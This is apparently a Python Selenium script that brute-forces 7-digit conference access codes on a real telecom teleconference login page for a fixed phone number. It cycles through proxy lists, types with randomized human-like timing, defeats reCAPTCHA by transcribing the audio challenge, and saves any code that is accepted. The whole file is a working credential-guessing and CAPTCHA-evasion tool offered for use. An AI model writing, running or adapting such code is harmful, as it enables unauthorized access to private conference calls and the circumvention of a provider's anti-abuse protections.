import selenium 
from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.proxy import Proxy, ProxyType
from selenium.webdriver.support.ui import Select
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.firefox.options import Options
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import TimeoutException
import platform
import time
import random
import json
from audioCaptcha import speech_rec
from connectionStatus import is_connected
from tqdm import tqdm
#loading 7 digit codes and store in a list
with open("doc/7digitcodes.txt", 'r') as file:
    code7digits = file.readlines()
#getting the phone number from the text file
with open('doc/phonenumber.txt','r') as file:
    number = file.read().strip()

#getting the proxy ip addresses from clean_proxes.txt file

service = Service(executable_path = 'chromedriver.exe')

## this is to make it platform independent....
options = webdriver.ChromeOptions()
#options = Options()
options.add_argument("--disable-notifications")
options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36")
#to disable the extensions
options.add_argument("--disable-extensions")


'''
options.add_experimental_option("prefs", { \
    "profile.default_content_setting_values.media_stream_mic": 2, 
    "profile.default_content_setting_values.media_stream_camera": 2,
    "profile.default_content_setting_values.geolocation": 1, 
    "profile.default_content_setting_values.notifications": 1 
  })

'''
if platform.system().lower() == 'linux':
    options.add_argument("--user-data-dir=cookies")
elif platform.system().lower() == "windows" :
    options.add_argument("--user-data-dir=C:\\Users\\Admin\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 6")



#the first half -------------------------------------------------------------------------------------------------------------------------------
# creating and opening browser with user data directory to save cookies
with open('working_proxies.txt' , 'r' , encoding = 'utf-8') as file:
    proxies = file.readlines()
pointer = 0
correct_proxies = 0


for proxy in tqdm(proxies):

    code_pointer = 0
    for code7 in tqdm(code7digits):
        
        print('#################################################################################')
        print('#                                                                               #')
        print(f"#                         {proxy.strip()} is used                              #")
        #print(f"#      {proxy.split('-')[0]} FROM {proxy.split('-')[1].strip()} is used        #")
        print(f'#                   {len(proxies[pointer:])} proxies remaining for test        #')
        print(f'#                    {correct_proxies} working proxies found                   #')
        print('#                                                                               #')
        print('#################################################################################')
        #myProxy = proxy.split('-')[0]
        myProxy = proxy.strip()
        proxy_opt = Proxy({
        'proxyType': ProxyType.MANUAL,
        'httpProxy': myProxy,
        'sslProxy': myProxy,
        'noProxy': ''})
        options.proxy = proxy_opt
        driver = webdriver.Firefox(service = service , options=options)
        
        try:
            print('Trying to connect to the given site')
            driver.get("https://teleconference.uc.att.com/ecm/")
        except:
            is_connected()

            print('The Connection wasnt successful Trying again with another proxy : - >')
            pointer+=1
            with open('http_proxies.txt' , 'w' , encoding = 'utf-8') as file:
                file.writelines(proxies[pointer:])
            driver.close()
            break

        try:
       
            page_load_failed = WebDriverWait(driver , 4).until(EC.presence_of_element_located((By.XPATH , "//div[@id='control-buttons']//button[@id='reload-button']")))
            pointer+=1
            print('The Page Didint Load Bro')
            with open('http_proxies.txt' , 'w' , encoding = 'utf-8') as file:
                file.writelines(proxies[pointer:])
            driver.close()
            break
        
    
        except:

            try:
                
                    
                phone_number_input = WebDriverWait(driver , 10).until(EC.presence_of_element_located((By.XPATH , "//input[@id='bp']")))
                print('Page Load Succeeded')
                driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
                actions = ActionChains(driver).send_keys(Keys.END).perform()
                with open('working_proxies.txt' , 'a' , encoding = 'utf-8') as file:
                    file.write(f'{proxy}\n')
                    
                print(f'Correct Proxy {proxy.strip()} has been stored in a separate file bro')
                correct_proxies+=1
                print('Putting  the phone number')
    
                phone_number_input.click()
                ActionChains(driver).key_down(Keys.CONTROL).send_keys('A').key_up(Keys.CONTROL).perform()
                for num in number[1:]:
                    phone_number_input.send_keys(num)
                    time.sleep(random.uniform(0 , 0.3))
                print('Phone number DONE')


                id_input = driver.find_element(By.XPATH , "//input[@id='mac']")
                id_input.click()
                print('Putting the CODE')
                print(f'The Code Being used is {code7.strip()[:-1]} -------- {len(code7digits)} remaining to test')
                ActionChains(driver).key_down(Keys.CONTROL).send_keys('A').key_up(Keys.CONTROL).perform()
                for code in code7.strip()[:-1]:
                    id_input.send_keys(code)
                    time.sleep(random.uniform(0.1 , 0.3))
                time.sleep(random.uniform(0.3 , 1.2))
                print('CODE DONE Bruv')


                print('TIme to put the name bro')
                name_input = driver.find_element(By.XPATH , "//input[@id='userName']")
                name_input.click()
                name = 'roger'
                ActionChains(driver).key_down(Keys.CONTROL).send_keys('A').key_up(Keys.CONTROL).perform()
                for i in name:
                    name_input.send_keys(i)
                    time.sleep(random.uniform(0.1 , 0.4))
                print('Name DONE Bruv')
                #time.sleep(120) --------------------------------------------------------------------------------------------------------------------
                print('Working on the recaptcha bro')
                

                time.sleep(0.4)
                
                for try_iter in range(5):
                    try:
                        driver.execute_script("window.scrollTo(0, 900);")

                        try:
                            driver.switch_to.frame(driver.find_element(By.XPATH , "//iframe[@title='reCAPTCHA']"))
                            #captcha = driver.find_element(By.XPATH , "//div[@class='recaptcha-checkbox-border']")
                            try:
                                captcha = WebDriverWait(driver , 5).until(EC.presence_of_element_located((By.XPATH , "//span[@id='recaptcha-anchor']")))
                                time.sleep(0.2)

                            except:
                                captcha = WebDriverWait(driver , 5).until(EC.presence_of_all_elements_located((By.XPATH , "//div[@id='rc-anchor-container']")))
                                time.sleep(0.2)
                            captcha.click()
                            #time.sleep(120)
                            driver.switch_to.default_content()
                            time.sleep(4)
                            driver.switch_to.frame(driver.find_element(By.XPATH , "//iframe[@title = 'recaptcha challenge expires in two minutes']"))
                            #driver.switch_to.frame(recaptcha_box_iframe)
                            time.sleep(0.6)
                            try:
                                print('Trying to click on the audio captcha button')
                                audio_button = driver.find_element(By.XPATH , "//button[@id='recaptcha-audio-button']")
                                audio_button.click()
                                print('Clicking on audio captcha was a success')
                                try:
                                    try_later = WebDriverWait(driver , 5).until(EC.presence_of_all_elements_located((By.XPATH , "//div[@class='rc-doscaptcha-header-text' and text() = 'Try again later']")))
                                    print('The Captcha showed to try later bro')
                                except:
                                    print('Neither the code clicked on the audio button nor the captcha showed up bro')
                                    pass
                            except:
                                try:
                                    try_later = driver.find_element(By.XPATH , "//div[@class='rc-doscaptcha-header-text' and text() = 'Try again later']")
                                    print('The Captcha showed to try later bro')
                                except:
                                    print('Neither the code clicked on the audio button nor the captcha showed up bro')
                                    pass
                        except:
                            print('There Was an Error In the CAPTCHA Section Bro')
                            time.sleep(1)
                            pass
                        #time.sleep(120)
                        audio_src = WebDriverWait(driver , 3).until(EC.presence_of_element_located((By.XPATH , "//audio[@id='audio-source']")))
                        the_audio_src = audio_src.get_attribute('src')
                        

                        print(f'The link to the audio is {the_audio_src} -------------------------------------- +++++ ')



                        audio_to_text = speech_rec(the_audio_src , proxy.strip())

                        audio_captcha_input = driver.find_element(By.XPATH , "//input[@id='audio-response']")
                        for i in audio_to_text:
                            audio_captcha_input.send_keys(i)
                            time.sleep(random.uniform(0.2 , 0.6))
                        print('Clicking On the Verify button')
                        verify_button = driver.find_element(By.XPATH , "//button[@id='recaptcha-verify-button' and text()='Verify']")
                        verify_button.click()
                        driver.switch_to.default_content()


                        time.sleep(1.2)
                        print('Time to click on the CONTINUE BUTTON BRO +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++')
                        continue_button = driver.find_element(By.XPATH , "//button[@class='button button--appearance-square button--theme-dark button--role-none button--full-width button--enabled ' and text() = 'Continue']")
                        continue_button.click()


                        time.sleep(1)
                         
                        #correct id
                        try:
                            waiting_for_the_host = WebDriverWait(driver , 10).until(EC.presence_of_element_located((By.XPATH , "//div[@class='status__message']//p[text() = 'Waiting for host to join']")))
                            print('A correct code is found')
                            driver.refresh()
                            time.sleep(2)
                            
                            #managing th e removal of the used code 
                            code_pointer += 1 
                            with open('./doc/7digitcodes.txt' , 'w') as f:
                                f.writelines(code7digits[code_pointer:])
                                print('Code file updation complete')
                            with open('./doc/rightcode.txt', 'w' ) as f:
                                f.writelines(f'{code7}\n')
                            
                            
                            break
        
                        except:
                            try:
                                driver.find_element(By.XPATH , "//div[@class='form__general-error-msg' and text()='Login failed. One or more of the credentials you entered is invalid.']")
                                #managing th e removal of the used code 
                                code_pointer += 1
                                with open('./doc/7digitcodes.txt' , 'w') as f:
                                    f.writelines(code7digits[code_pointer:])
                                    print('Code file updation complete')

                                
                                break
                            except:
                                print('This Aint no Login Failed Error Bruh Its something else : ->')
                            
                            finally:
                                print('The Code was Incorrect Bro')
                    except NoSuchElementException:
                        print('NO SUCH ELEMENT EXCEPTION OCCURED ---- !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')
                        time.sleep(1)
                        driver.execute_script("window.scrollTo(0, 900);")
                        print(f'going for trial round {try_iter+1}')
                        continue
                    except TimeoutException:
                        time.sleep(1)
                        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
                        print('A TIMEOUT EXCEPTION OCCURED')    
                        break
                driver.close()
                
                
                
            except:
                is_connected()

                pointer+=1
                print('No input box found bro so the page didnt load')
                with open('http_proxies.txt' , 'w' , encoding = 'utf-8') as file:
                    file.writelines(proxies[pointer:])
                driver.close()
                break
        break
    time.sleep(0.5)
    




    
  

